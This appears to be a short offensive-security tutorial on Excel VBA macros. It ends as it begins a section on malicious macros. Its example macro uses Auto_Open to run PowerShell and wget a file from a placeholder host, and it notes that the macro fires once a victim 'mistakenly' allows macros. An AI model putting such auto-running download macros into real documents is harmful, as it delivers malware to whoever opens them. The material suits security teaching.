We need Microsoft Office version of Excel in order to be able to use Macros.

#### Macros are a set of programming instructions written in Visual Basic, which can automate repetitive and standardized process in Excel and other Microsoft Applications like Access, Powerpoint, Word and Outlook
- An excel macro is an action or set of actions that can be recorded, named, saved and executed as many times required and whenever desired.
- By using macros, we are able to automate repetitive tasks associated with data manipulation and data reporting.


#### Navigate to Macros in Excel
```
View - > Macros - > <Enter Name of Macro you want to create> - > Create - > <Write your VBA script to be executed>
```

Example of a VBA macro
```VBA
Sub Main()
	PID=Shell("powershell.exe -c wget http://<ip>:port/file.txt -o new.txt",vbNormalFocus)
End Sub

Sub Auto_Open()
	Main
End Sub
```
- This macro will be executed after you open a file and "mistakenly" click on "Allow all Macros"
- The `Auto_Open()` feature automatically executes the macros

## Malicious macros in Excel
- Now that we are familiar with macros and auto open feature within Office Products, we can dive deep into generating our malicious macros.




















